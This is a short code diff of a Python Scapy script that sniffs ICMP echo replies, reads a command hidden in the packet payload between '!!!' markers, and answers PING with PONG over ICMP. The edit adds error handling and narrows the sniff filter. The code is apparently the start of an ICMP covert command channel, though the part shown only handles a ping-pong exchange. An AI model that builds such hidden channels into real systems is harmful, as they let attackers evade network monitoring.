@@ -7,12 +7,14 @@ def send_over_icmp(clientip, response):
     send(evil)
 
 def handle(pkt):
-    src = pkt[IP].dst
-    payload = str(pkt.payload)
-    parsed = re.split('!{3}', payload)
-    command = parsed[1][:-1]
+    try:
+        src = pkt[IP].dst
+        payload = str(pkt.payload)
+        parsed = re.split('!{3}', payload)
+        command = parsed[1][:-1]
+        if command == "PING":
+            send_over_icmp(src, "PONG")
+    except:
+        pass
 
-    if command == "PING":
-        send_over_icmp(src, "PONG")
-
-sniff(filter="icmp", prn=handle)
+sniff(filter="icmp[icmptype] == icmp-echoreply", prn=handle)
